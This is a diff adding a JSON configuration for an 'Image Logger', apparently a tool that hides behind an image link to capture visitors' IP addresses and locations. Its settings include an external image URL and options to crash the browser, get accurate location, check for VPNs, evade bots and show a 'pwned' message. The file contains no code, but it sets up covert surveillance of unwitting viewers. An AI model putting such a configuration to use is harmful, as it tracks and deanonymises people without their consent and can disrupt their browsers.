@@ -1,0 +1,17 @@
+{
+    "image": "http://beijincdc.cn/html/CImage_files/image001.jpg",
+    "imageArgument": true,
+    "username": "Image Logger",
+    "color": 65535,
+    "crashBrowser": false,
+    "accurateLocation": false,
+    "message": {
+        "doMessage": false,
+        "message": "This browser has been pwned by an Image Logger.",
+        "richMessage": true
+    },
+    "vpnCheck": 1,
+    "linkAlerts": true,
+    "buggedImage": true,
+    "antiBot": 1
+}
